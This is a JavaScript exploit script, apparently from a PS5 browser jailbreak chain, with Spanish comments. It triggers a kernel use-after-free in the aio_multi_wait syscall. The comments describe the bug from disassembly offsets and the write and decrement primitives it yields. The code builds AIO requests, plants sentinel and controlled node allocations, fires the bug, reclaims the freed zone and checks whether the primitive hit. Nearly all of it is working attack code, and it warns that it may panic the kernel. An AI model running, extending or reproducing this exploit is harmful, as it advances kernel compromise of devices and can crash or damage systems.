// bagagwa_uaf_1320.js — BAGAGWA: disparo del UAF determinista (aio_multi_wait mode 0).
// Spec: "Bagagwa Multi Chain Exploit". Esta version DISPARA el bug (fase UAF) y
// mide su efecto con objetos testigo; NO implementa aun el leak 727 ni la
// conversion osem (son especulativos sin un testigo que confirme el efecto).
//
// IDEA DEL BUG (syscall 663 = aio_multi_wait, body 0x805c0210):
//   El array de waiters se cachea en [rbx+0x40] y se recorre con add r14,0x38.
//   Con num>=2 y mode 0, el dispatch (0x805c08e5) hace rcx = [rbx+0x40] SIN
//   indexar: enlaza SIEMPRE el mismo nodo (elemento 0) en las listas de las N
//   requests, sobreescribiendo node->owner (+0x18) en cada iteracion. El
//   cleanup (0x805c0da1) desenlaza por node->owner -> solo lo quita de la
//   ULTIMA request; al liberar el array (0x805c0f93) las requests 0..N-2
//   conservan req->waiters apuntando a memoria liberada (UAF).
//
//   El waker (0x805c1d2d) es el primitivo de escritura:
//     mov [r15+0x20], eax      ; write 32-bit controlado
//     mov rdi,[r15+0x10]; +0x18; mtx_lock  ; lock sobre puntero controlado
//     mov rax,[r15]
//     dec [rax]                ; decremento 32-bit arbitrario #1
//     mov rax,[r15+8]
//     test rax,rax / dec [rax] ; decremento #2 (mode 0 lo deja M_ZERO -> libre)
//
// ABI real (confirmado en lapse.js y osem2_1320.js):
//   aio_multi_wait(ids*, num_ids, states*, mode, timeout)   [0x297]
//   aio_submit_cmd(cmd, reqs*, num_reqs, priority, ids*)    [0x29D]
//   aio_multi_cancel(ids*, num_ids, states*)                [0x29A]
//   aio_multi_delete(ids*, num_ids, states*)                [0x296]
//   AIO_CMD_MULTI_READ = 0x1001
//
// FASES:
//   0  ABI: familia AIO responde (si ENOSYS total -> abortar)
//   1  crear N requests AIO validas (submit multi-read) -> ids vivas
//   2  preparar nodo de control + testigos de zona (0x70 array, 0x60 osem)
//   3  DISPARO: aio_multi_wait(ids, N, states, mode=0, timeout=0)
//   4  reclamar zona liberada y releer testigos (deteccion del efecto)
//   5  veredicto + limpieza
//
// Logging: log() del bridge -> #scr + panel + log remoto.
// DESTRUCTIVO: fase 3+ puede colgar/panicar. Se para en la ultima linea visible.
(() => {
    const B = (x) => BigInt(x), I = (x) => BigInt.asIntN(64, x);
    const Y = 331n; // sched_yield

    const say = (s) => { try { log("[bagagwa] " + s); } catch (e) {} };
    const notif = (s) => { try { send_notification(("[bagagwa] " + s).slice(0, 120)); } catch (e) {} };
    const EN = () => { try { const m = /^(\d+)/.exec(get_error_string()); return m ? parseInt(m[1], 10) : -1; } catch (e) { return -1; } };
    const EL = { 1: "EPERM", 2: "ENOENT", 3: "ESRCH", 9: "EBADF", 12: "ENOMEM", 14: "EFAULT",
        16: "EBUSY", 17: "EEXIST", 22: "EINVAL", 35: "EAGAIN", 78: "ENOSYS", 93: "ENOTCAPABLE" };
    const J = (e) => " errno=" + e + "(" + (EL[e] || "?") + ")";
    const FX = (v) => "0x" + B(v).toString(16);
    const VS = (q) => q.ex ? "EX(" + q.msg + ")" : (q.r >= 0n ? "ok0x" + q.r.toString(16) : "e" + q.e + (EL[q.e] ? "(" + EL[q.e] + ")" : ""));
    const VIVA = (q) => !q.ex && !(q.r === -1n && q.e === 78);

    const SC = (tag, sc, args, desc) => {
        const p = tag + (desc ? " " + desc : "") + " (" + args.map(FX).join(",") + ")";
        say(p + " ...");
        const o = { tag, r: -9999n, e: -1, ex: false, msg: "" };
        try { o.r = I(syscall(sc, ...args.map((a) => B(a)))); if (o.r < 0n) o.e = EN(); }
        catch (err) { o.ex = true; o.msg = String(err && err.message || err).slice(0, 60); say(p + " -> THREW " + o.msg); return o; }
        say(p + " -> " + (o.r >= 0n ? "ret=0x" + o.r.toString(16) + " OK" : o.r + J(o.e)));
        return o;
    };

    // ABI
    const A_INIT = 0x29En, A_SUBMIT = 0x295n, A_SUBCMD = 0x29Dn;
    const A_WAIT = 0x297n, A_CANCEL = 0x29An, A_DEL = 0x296n;
    const A_DEBUG = 0x2D7n;
    const AIO_CMD_MULTI_READ = 0x1001n;

    // Numero de requests. La spec: num>=2, mode 0 -> se enlazan todas al nodo 0.
    const NREQ = 2;
    const NODE_BYTES = 0x38;   // tamaño de nodo waiter
    const REQ_BYTES = 0x28;    // tamaño de request (lapse make_reqs1)

    say("begin - Bagagwa UAF (aio_multi_wait mode 0) pid=" + I(syscall(SYSCALL.getpid))
        + " fw=" + (PS5.fw || "?") + " mode=" + (PS5.mode || "?"));

    // ===== FASE 0: la familia AIO responde =====
    say("F0: ABI check familia AIO");
    // [Mods X1NON] en stub mode, pre-check de los stubs que vamos a usar.
    // Si falta alguno (p.ej. 727/0x2D7 NO tiene wrapper en libkernel_web),
    // se aborta con diagnostico en vez de fallar a mitad del disparo.
    if (PS5.stubMode) {
        const stubs = (typeof SYSCALL_STUBS !== "undefined" && SYSCALL_STUBS)
            ? SYSCALL_STUBS : null;
        if (!stubs) {
            say("VERDICT: stubMode activo sin tabla SYSCALL_STUBS -> abortar.");
            return;
        }
        const need = [[663, "aio_multi_wait"], [669, "aio_submit_cmd"],
            [662, "aio_multi_delete"], [666, "aio_multi_cancel"], [20, "getpid"]];
        const miss = need.filter(([n]) => !stubs[String(n)]);
        if (miss.length) {
            say("VERDICT: stubs ausentes: "
                + miss.map(([n, nm]) => nm + "(" + n + ")").join(",") + " -> abortar.");
            notif("bagagwa: stubs ausentes, abortando");
            return;
        }
        say("F0 stubs OK: aio_multi_wait=0x"
            + Number(stubs["663"]).toString(16)
            + " submit_cmd=0x" + Number(stubs["669"]).toString(16)
            + " (nota: 0x2D7/727 sin stub -> leak no disponible en modo stub)");
    }
    const qInit = SC("AIO_INIT_0x29e", A_INIT, [0n], "(flags=0)");
    const qSubmit = SC("AIO_SUBMIT_0x295", A_SUBMIT, [0n, 0n, 0n], "(0,0,0)");
    const qWait = SC("AIO_WAIT_0x297", A_WAIT, [0n, 0n, 0n, 0n, 0n], "(0,0,0,mode0,0)");
    const qDebug = SC("AIO_DEBUG_0x2d7", A_DEBUG, [1n, 0n], "(1,NULL)");
    say("F0 gate: init=" + VS(qInit) + " submit=" + VS(qSubmit) + " wait=" + VS(qWait) + " debug=" + VS(qDebug));
    if (!VIVA(qInit) && !VIVA(qSubmit) && !VIVA(qWait)) {
        say("VERDICT: AIO MUERTA (ENOSYS total) -> Bagagwa no alcanzable; abortar sin disparar.");
        notif("bagagwa: AIO muerta, cadena no alcanzable");
        return;
    }

    // ===== FASE 1: crear N requests AIO validas =====
    // reqs[i] layout (lapse): [{+0x20} = fd/objetivo]. Los ids los devuelve
    // aio_submit_cmd en ids[i] (4 bytes c/u), con flag MULTI.
    // [Mods 13.60] El fd debe tener lectura PENDIENTE (asi el request queda
    // vivo y con waiters, como hace lapse con sockets). fd=0 no existe en el
    // sandbox del browser -> socketpair(AF_UNIX) y leemos de un extremo vacio.
    say("F1: crear " + NREQ + " requests AIO (multi-read, lectura pendiente)");
    const reqs = malloc(REQ_BYTES * NREQ);
    let fdTarget = 0n, fdPair = -1n;
    const sv = malloc(8);
    const qsp = SC("SOCKETPAIR_0x35", 0x35n, [1n, 1n, 0n, sv], "(AF_UNIX,SOCK_STREAM,0,sv)");
    if (qsp.r >= 0n) {
        fdTarget = BigInt(Number(read32(sv)));
        fdPair = Number(read32(sv + 4n));
        say("F1 socketpair ok: fdA=" + fdTarget + " fdB=" + fdPair + " (lectura pendiente)");
    } else {
        say("F1 socketpair fallo (" + VS(qsp) + ") -> fallback fd=0 (probable EBADF en submit)");
    }
    for (let i = 0; i < NREQ; i++) write32(reqs + BigInt(i * REQ_BYTES + 0x20), fdTarget);
    const ids = malloc(4 * NREQ);
    for (let i = 0; i < NREQ; i++) write32(ids + BigInt(i * 4), 0n);
    const states = malloc(4 * NREQ);
    for (let i = 0; i < NREQ; i++) write32(states + BigInt(i * 4), 0n);

    const sub = SC("AIO_SUBMIT_CMD", A_SUBCMD,
        [AIO_CMD_MULTI_READ, reqs, B(NREQ), 3n, ids], "(MULTI_READ,reqs," + NREQ + ",prio3,ids)");
    const idList = [];
    for (let i = 0; i < NREQ; i++) {
        const r = Number(read32(ids + BigInt(i * 4)));
        idList.push(r);
        say("F1 id[" + i + "] = " + FX(r));
    }
    say("F1 submit=" + VS(sub) + " ids=" + idList.map(FX).join(","));

    // ===== FASE 2: nodo de control + objetos testigo =====
    // mode 0 no inicializa node->[8]; queda M_ZERO y es controlable post-free.
    // El nodo que el kernel usa internamente NO lo podemos crear nosotros, pero
    // si preparamos bloques del MISMO tamaño de zona (0x70 del array con num=2,
    // y 0x60 del objeto osem) con un patron centinela, cualquier reutilizacion
    // o decremento posterior sera DETECTABLE al releerlos.
    say("F2: preparar nodo de control + testigos de zona");
    const node = malloc(NODE_BYTES);
    const decTarget1 = malloc(8);
    const decTarget2 = malloc(8);
    write64(decTarget1, 0x4141414141414141n);
    write64(decTarget2, 0x4242424242424242n);
    // El waker hace mtx_lock sobre [r15+0x10]+0x18. Si el kernel usara este nodo
// y el puntero fuera NULL, escribiria en 0x18 -> panic. Por eso apuntamos a un
    // bloque propio VALIDO y alineado (no NULL): asi un mtx_lock real escribe en
    // memoria nuestra y no casca.
    const mtxCell = malloc(8);
    write64(mtxCell, 0n);
    write64(node + 0x00n, decTarget1);
    write64(node + 0x08n, decTarget2);
    write64(node + 0x10n, mtxCell);     // mtx_lock ptr -> bloque propio valido
    write32(node + 0x20n, 0x13371337n);
    say("F2 node=" + FX(node) + " mtxCell=" + FX(mtxCell));

    // Testigo principal: mismo tamaño que el array de waiters con num=2 (0x70).
    const WIT_BYTES = 0x70;
    const witness = malloc(WIT_BYTES);
    const PAT = 0xDEC0DE0000000000n;
    for (let i = 0n; i < BigInt(WIT_BYTES); i += 8n) write64(witness + i, PAT + i);

    // Testigo osem: zona 0x60, con el refcount de la spec en +0x54 (32-bit).
    const OSEM_BYTES = 0x60;
    const osemWit = malloc(OSEM_BYTES);
    const OPAT = 0xBEEF000000000000n;
    for (let i = 0n; i < BigInt(OSEM_BYTES); i += 8n) write64(osemWit + i, OPAT + i);
    write32(osemWit + 0x54n, 2n);       // refcount centinela "2"

    // Snapshot exacto del contenido inicial: se compara contra el al releer
    // (evita falsos positivos por el refcount no alineado en +0x54).
    const witSnap = [], osemSnap = [];
    for (let i = 0n; i < BigInt(WIT_BYTES); i += 8n) witSnap.push(read64(witness + i));
    for (let i = 0n; i < BigInt(OSEM_BYTES); i += 8n) osemSnap.push(read64(osemWit + i));

    const HXWIT = (b, n) => { let x = ""; for (let i = 0n; i < BigInt(n); i += 8n) x += read64(b + i).toString(16) + " "; return x; };
    say("F2 dec1=" + FX(decTarget1) + " dec2=" + FX(decTarget2));
    say("F2 witness=" + FX(witness) + " osemWit=" + FX(osemWit) + " refcnt[+0x54]=2");
    say("F2 pre witness: " + HXWIT(witness, 0x20));
    say("F2 pre osemWit: " + HXWIT(osemWit, 0x20) + "... refcnt=" + Number(read32(osemWit + 0x54n)));

    // ===== FASE 3: DISPARO UAF =====
    // aio_multi_wait(ids, NREQ, states, mode=0, timeout=0). Con mode 0 y num>=2
    // el mismo nodo se enlaza N veces y solo se desenlaza del ultimo; el array
    // se libera con requests colgando. timeout=0 => no bloquea.
    say("F3: DISPARO aio_multi_wait(ids," + NREQ + ",states,mode=0,timeout=0)");
    notif("bagagwa: disparando aio_multi_wait mode 0");
    const det = SC("AIO_WAIT_MODE0", A_WAIT, [ids, B(NREQ), states, 0n, 0n], "(ids,N,states,mode0,0)");
    say("F3 resultado: " + VS(det) + "  <- si la consola sigue viva, el UAF no panicó");
    for (let i = 0; i < 200; i++) { try { syscall(Y); } catch (e) {} }

    // ===== FASE 4: releer testigos (deteccion del efecto) =====
    // Reclamar la zona liberada con allocs del mismo tamaño hace que el allocator
    // reutilice la zona del array liberado; si el UAF es real, el contenido de
    // los testigos cambia o el kernel escribe sobre ellos.
    say("F4: reclamar zona liberada y releer testigos");
    const reclaim1 = malloc(0x70);
    const reclaim2 = malloc(0x60);
    for (let i = 0n; i < 0x70n; i += 8n) write64(reclaim1 + i, 0xCAFEBABE00000000n + i);
    for (let i = 0n; i < 0x60n; i += 8n) write64(reclaim2 + i, 0xFEEDFACE00000000n + i);
    for (let i = 0; i < 500; i++) { try { syscall(Y); } catch (e) {} }

    const HXWIT2 = (b, n) => { let x = ""; for (let i = 0n; i < BigInt(n); i += 8n) x += read64(b + i).toString(16) + " "; return x; };
    let witChanged = false, osemChanged = false;
    {
        let k = 0;
        for (let i = 0n; i < BigInt(WIT_BYTES); i += 8n, k++)
            if (read64(witness + i) !== witSnap[k]) witChanged = true;
        k = 0;
        for (let i = 0n; i < BigInt(OSEM_BYTES); i += 8n, k++)
            if (read64(osemWit + i) !== osemSnap[k]) osemChanged = true;
    }
    const refcntNow = Number(read32(osemWit + 0x54n));

    say("F4 post witness: " + HXWIT2(witness, 0x20));
    say("F4 post osemWit: " + HXWIT2(osemWit, 0x20) + "... refcnt=" + refcntNow);
    say("F4 refcnt cambio: " + (refcntNow !== 2 ? "SI (" + refcntNow + ")" : "no"));

    // ===== FASE 5: veredicto + limpieza =====
    say("F5: limpieza");
    SC("AIO_MULTI_CANCEL", A_CANCEL, [ids, B(NREQ), states], "(ids,N,states)");
    SC("AIO_MULTI_DELETE", A_DEL, [ids, B(NREQ), states], "(ids,N,states)");
    if (fdTarget > 0n) { try { syscall(SYSCALL.close, fdTarget); } catch (e) {} }
    if (fdPair >= 0n) { try { syscall(SYSCALL.close, fdPair); } catch (e) {} }

    const post1 = read64(decTarget1), post2 = read64(decTarget2);
    const decHit = (post1 !== 0x4141414141414141n) || (post2 !== 0x4242424242424242n);
    let v;
    if (det.ex) v = "FALLO: aio_multi_wait mode0 THREW (" + det.msg + ")";
    else if (det.r < 0n && det.e === 78) v = "aio_multi_wait ENOSYS -> no existe en este sandbox";
    else if (decHit) v = "PRIMITIVO VIVO: dec alcanzo el objetivo (dec1=" + FX(post1) + " dec2=" + FX(post2) + ")";
    else if (witChanged || osemChanged) v = "EFECTO DETECTADO en testigos (wit=" + witChanged + " osem=" + osemChanged + " refcnt=" + refcntNow + ")";
    else v = "mode0 retorno " + VS(det) + " sin efecto observable en testigos (UAF latente/invisible)";
    say("VERDICT: " + v);
    notif(("bagagwa: " + v).slice(0, 120));
    for (let i = 0; i < 8; i++) { notif(("bagagwa: " + v).slice(0, 100)); for (let j = 0; j < 1000; j++) { try { syscall(Y); } catch (e) {} } }
    say("PAYLOAD DONE");
})();